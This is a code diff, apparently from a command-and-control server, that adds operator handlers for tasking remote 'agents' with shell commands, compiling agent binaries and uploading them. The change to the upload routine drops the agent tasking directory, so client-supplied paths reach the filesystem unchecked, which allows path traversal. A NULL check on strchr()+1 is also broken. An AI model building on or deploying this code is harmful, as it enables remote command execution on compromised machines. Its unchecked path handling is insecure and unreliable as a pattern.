@@ -448,7 +448,7 @@ int server_upload_file(clientDat *agent, char *ptr, int is_module){
     memset(directory, 0, sizeof(directory));
     memset(tmpbuffer, 0, sizeof(tmpbuffer));
     // get filesize 
-    sprintf(buff, "%s/agents/%s/tasking/%s", getcwd(directory, sizeof(directory)), agent->id, ptr);
+    sprintf(buff, "%s/%s", getcwd(directory, sizeof(directory)), ptr);
     size = misc_get_file(buff, &file_data);
         
     if(size < 0){
@@ -676,10 +676,38 @@ void manager_handler(struct clientNode *node){
 
         case MANAG_TASK_SC:
             printf("Caught shell command tasking request\n");
+            
+            d_ptr = strchr(ptr, ':') +1;
+            if(d_ptr == NULL){
+                printf("Wrong format identified from input\n");
+                return;
+            }
+            count = misc_index_of(ptr, ':', 0);
+            dat_ptr = misc_substring(ptr, count, strlen(ptr));
+            
+            agent_task(AGENT_EXEC_SC, dat_ptr, d_ptr);
+            rc = ssh_channel_write(manager->chan, "ok", 2);
+            if (rc == SSH_ERROR)
+            {
+                printf("Manager %s: Failed to handle agent: %s\n", manager->id, ssh_get_error(manager->session));
+                return;
+            }
             break;
 
         case MANAG_GET_AGENT:
             printf("Caught agent creation call\n");
+
+            d_ptr = strchr(ptr, ':') +1;
+            if(d_ptr == NULL){
+                printf("Wrong format identified from input\n");
+                return;
+            }
+            count = misc_index_of(ptr, ':', 0);
+            dat_ptr = misc_substring(ptr, count, strlen(ptr));
+
+            agent_compile(dat_ptr, d_ptr);
+            dat_ptr = NULL;
+            server_upload_file(manager, "out/client.out", 0);
             break;
 
         case MANAG_REG_AGENT:
@@ -765,7 +793,7 @@ void agent_handler(struct clientNode *node){
             break;
 
         case AGENT_DOWN_FILE:
-
+            sprintf(buff, "agents/%s/tasking/%s", agent->id, ptr);
             server_upload_file(agent, ptr, 0);
             break;
 
